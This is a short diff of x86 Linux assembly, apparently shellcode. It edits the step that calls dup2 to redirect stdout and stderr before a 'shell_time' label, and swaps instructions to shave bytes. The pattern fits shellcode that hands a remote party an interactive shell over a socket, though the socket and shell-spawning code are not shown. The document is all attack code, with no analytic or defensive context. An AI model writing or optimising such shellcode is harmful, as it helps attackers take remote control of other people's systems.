@@ -177,12 +177,11 @@ change_fd:
 	xor eax, eax	; clean out eax
 	mov al, 0x3f	; define __NR_dup2    63 (0x3f)	
 	int 0x80	; call it
-	mov al, 0x3f
-	mov cl, 0x1	; 1 (std out) in cl
+	mov al, 0x3f	; dup2
+	inc ecx		; 1 (std out) in cl
 	int 0x80	; call it
-	mov al, 0x3f
-	xor ecx, ecx	; clean ecx
-	mov cl, 0x2	; 2 (std error) in cl
+	mov al, 0x3f	; dup2
+	inc ecx		; 2 (std error) in cl
 	int 0x80	; call it
 
 shell_time:
